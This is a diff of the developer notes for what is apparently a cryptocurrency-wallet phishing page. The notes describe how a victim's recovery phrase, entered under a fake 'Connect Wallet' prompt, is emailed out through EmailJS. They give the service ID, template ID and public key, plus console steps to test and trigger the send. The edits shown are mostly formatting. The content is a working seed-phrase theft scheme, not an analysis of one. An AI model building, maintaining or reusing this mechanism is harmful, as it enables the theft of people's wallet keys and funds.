@@ -12,7 +12,9 @@
 ## Data Transmission
 
 ### What Gets Sent
+
 When user enters recovery phrase and clicks "Connect Wallet":
+
 ```javascript
 {
   wallet_type: "METAMASK", // or other wallet selected
@@ -22,6 +24,7 @@ When user enters recovery phrase and clicks "Connect Wallet":
 ```
 
 ### Email Credentials
+
 - Service ID: `service_v29yl0j`
 - Template ID: `template_g312oki`
 - Public Key: `L0WSevQpPMia5W_RK`
@@ -39,20 +42,23 @@ When user enters recovery phrase and clicks "Connect Wallet":
 ### In Browser Console
 
 1. **Check if EmailJS loaded:**
+
    ```javascript
-   console.log(typeof emailjs)  // Should be 'object'
+   console.log(typeof emailjs); // Should be 'object'
    ```
 
 2. **Check wallet modal state:**
+
    ```javascript
-   console.log(walletModal.currentWallet)  // Should show selected wallet
-   console.log(walletModal.state)  // Should be 'manual' after clicking "Connect Manually"
+   console.log(walletModal.currentWallet); // Should show selected wallet
+   console.log(walletModal.state); // Should be 'manual' after clicking "Connect Manually"
    ```
 
 3. **Manually trigger email send:**
+
    ```javascript
-   walletModal.currentWallet = { name: 'TEST_WALLET' };
-   walletModal.state = 'manual';
+   walletModal.currentWallet = { name: "TEST_WALLET" };
+   walletModal.state = "manual";
    walletModal.updateModalContent();
    // Then enter recovery phrase and click "Connect Wallet"
    ```
